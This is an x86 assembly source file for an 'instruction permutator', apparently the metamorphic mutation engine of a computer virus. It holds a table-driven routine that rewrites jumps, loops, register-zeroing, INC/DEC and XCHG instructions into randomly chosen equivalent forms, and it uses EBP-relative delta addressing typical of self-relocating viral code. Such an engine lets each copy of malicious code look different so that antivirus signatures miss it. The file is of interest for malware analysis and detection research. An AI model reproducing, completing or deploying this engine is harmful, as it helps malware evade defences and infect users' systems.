; Simple instruction permutator

Mutate	proc
	push	edx ebx
	mov	ebx,edi
	lea	edi,[MutTbl][ebp]
Findt:	mov	al,[esi]
	movzx	ecx,1 ptr [edi]
	or	ecx,ecx
	jz	mBadOpcode
	inc	edi
repne	scasb
	jnz	mSkipBlock
	add	edi,ecx
	mov	eax,[edi]
	add	eax,ebp

	push	edi
	mov	edi,ebx
	Call	eax
	pop	edx
	jc	xNoMorph
	pop	ebx edx
	ret
xNoMorph:
	mov	edi,edx
mSkipBlock:
	add	edi,4
	jmp	Findt
mBadOpcode:
	mov	edi,ebx
	pop	ebx edx
	stc
	ret
Mutate	endp
;--------------------------------------------------------
Mut_ShortJmp:
	mov	al,0Fh
	stosb
	lodsb
	add	al,10h
	stosb

	lodsb
	cbw
	or	ax,ax
	jge	NotL
	or	eax,0FFFF0000h
NotL:	add	eax,1
	stosd
        clc
        ret
;--------------------------------------------------------

Mut_ShortJmp2:
	mov	al,0E9h
	stosb
	lodsb
	lodsb
	cbw
	or	ax,ax
	jge	NotL1
	or	eax,0FFFF0000h
NotL1:	add	eax,1
	stosd
        clc
	ret
;--------------------------------------------------------

Mut_Loop:
	mov	eax,edi
	Call	GetJmpAddr
	inc	4 ptr [eax]

        mov     al,49h          ; dec ecx
        stosb
	mov	al,0Fh          ; jnz ...
	stosb
        mov     al,85h
	stosb

	lodsb
	lodsb
	cbw
	or	ax,ax
	jge	NotL3
	or	eax,0FFFF0000h
NotL3:	stosd
        clc
        ret
;---------------------------------------------------------------------
Mut_CheckZero:
	Call	TryMutate
	jnz	NotRegReg

	mov	al,[esi][1]
	cmp	al,0C0h
	jb	NotRegReg
	push	eax
	and	al,00111000b
	shr	al,3
	mov	cl,al
	pop	eax
	and	al,111b
	cmp	cl,al
	jnz	NotRegReg
	Call	EncodeFreeReg
	add	esi,2
	clc
	ret
NotRegReg:
	stc
	ret
;---------------------------------------------------------------------
TryMutate	proc
	push	eax
	mov	eax,3
	Call	Random
	or	eax,eax
	pop	eax
	ret
TryMutate	endp
;---------------------------------------------------------------------
Mut_MovZero:
	Call	TryMutate
	jnz	NotRegReg

	mov	eax,[esi][1]
	or	eax,eax
	jnz	NotRegReg
	mov	al,[esi]
	sub	al,0B8h
	Call	EncodeFreeReg
	add	esi,5
	clc
	ret
;=============
EncodeFreeReg	proc
	push	eax
	mov	eax,5
	Call	Random
	or	eax,eax
	jz	EncodeMovZero
	dec	eax
	mov	al,[ZeroTbl][ebp][eax]
	stosb
	pop	eax
	mov	cl,al
	shl	al,3
	add	al,cl
	add	al,0C0h
	stosb
	ret
EncodeMovZero:
	pop	eax
	add	al,0B8h
	stosb
	xor	eax,eax
	stosd
	ret
EncodeFreeReg	endp
;---------------------------------------------------------------------
Mut_Xchg:
	Call	TryMutate
	jnz	NoxMut

	lodsb
	sub	al,90h
	push	eax
	add	al,50h
	stosb
	mov	al,50h
	stosb
	pop	eax
	add	al,58h
	stosb
	mov	al,58h
	stosb
	clc
	ret
NoxMut:
	stc
	ret
;---------------------------------------------------------------------
Mut_Inc:
	Call	TryMutate
	jnz	NoxMut
	lodsb
	sub	al,40h
	Call	EncodeInc
	ret
;=============
EncodeInc	proc
	xchg	eax,ebx
	mov	eax,3
	Call	Random
	dec	eax
	jz	GenAdd
	dec	eax
	jz	GenSub
	mov	al,40h
	add	al,bl
	stosb
	clc
	ret
GenAdd:	mov	al,83h
	stosb
	mov	al,bl
	add	al,0C0h
	stosb
	mov	al,1
	stosb
	clc
	ret
GenSub:	mov	al,83h
	stosb
	mov	al,bl
	add	al,0E8h
	stosb
	mov	al,-1
	stosb
	ret
EncodeInc	endp
;---------------------------------------------------------------------
Mut_Dec:
	Call	TryMutate
	jnz	NoxMut
	lodsb
	sub	al,48h
	Call	EncodeDec
	clc
	ret
;=============
EncodeDec	proc
	xchg	eax,ebx
	mov	eax,3
	Call	Random
	dec	eax
	jz	DecAdd
	dec	eax
	jz	DecSub
	mov	al,48h
	add	al,bl
	stosb
	clc
	ret
DecAdd:	mov	al,83h
	stosb
	mov	al,bl
	add	al,0C0h
	stosb
	mov	al,-1
	stosb
	clc
	ret
DecSub:	mov	al,83h
	stosb
	mov	al,bl
	add	al,0E8h
	stosb
	mov	al,1
	stosb
	ret
EncodeDec	endp
;---------------------------------------------------------------------
TryIncDec	proc
	mov	al,[esi][1]
	cmp	al,0C0h
	jb	NoxMut
	and	al,11111000b
	cmp	al,0C0h
	jz	CheckAdd
	cmp	al,0E8h
	jnz	NoxMut
	mov	al,[esi][2]
	cmp	al,1
	jz	EnDec
	cmp	al,-1
	jnz	NoxMut
	mov	al,[esi][1]
	sub	al,0E8h
	add	esi,3
	Call	EncodeInc
	clc
	ret
EnDec:	mov	al,[esi][1]
	sub	al,0E8h
	add	esi,3
	Call	EncodeDec
	clc
	ret
;==
CheckAdd:
	mov	al,[esi][2]
	cmp	al,-1
	jz	EnxDec
	cmp	al,1
	jnz	NoxMut
	mov	al,[esi][1]
	sub	al,0C0h
	add	esi,3
	Call	EncodeInc
	clc
	ret
EnxDec:	mov	al,[esi][1]
	sub	al,0C0h
	add	esi,3
	Call	EncodeDec
	clc
	ret
TryIncDec	endp
;---------------------------------------------------------------------

MutTbl	db	1
	db	0EBh
	dd	offset Mut_ShortJmp2

	db	16
	db	70h,71h,72h,73h,74h,75h,76h,77h
	db	78h,79h,7Ah,7Bh,7Ch,7Dh,7Eh,7Fh
	dd	offset Mut_ShortJmp

	db	3
	db	0E0h,0E1h,0E2h
	dd	offset Mut_Loop
	
	db	4
ZeroTbl	db	31h,33h,29h,2Bh
	dd	offset Mut_CheckZero

	db	8
	db	0B8h,0B9h,0BAh,0BBh,0BCh,0BDh,0BEh,0BFh
	dd	offset Mut_MovZero

	db	7
	db	91h,92h,93h,94h,95h,96h,97h
	dd	offset Mut_Xchg

	db	8
	db	40h,41h,42h,43h,44h,45h,46h,47h
	dd	offset Mut_Inc

	db	8
	db	48h,49h,4Ah,4Bh,4Ch,4Dh,4Eh,4Fh
	dd	offset Mut_Dec

	db	1
	db	83h
	dd	offset TryIncDec

	db	0
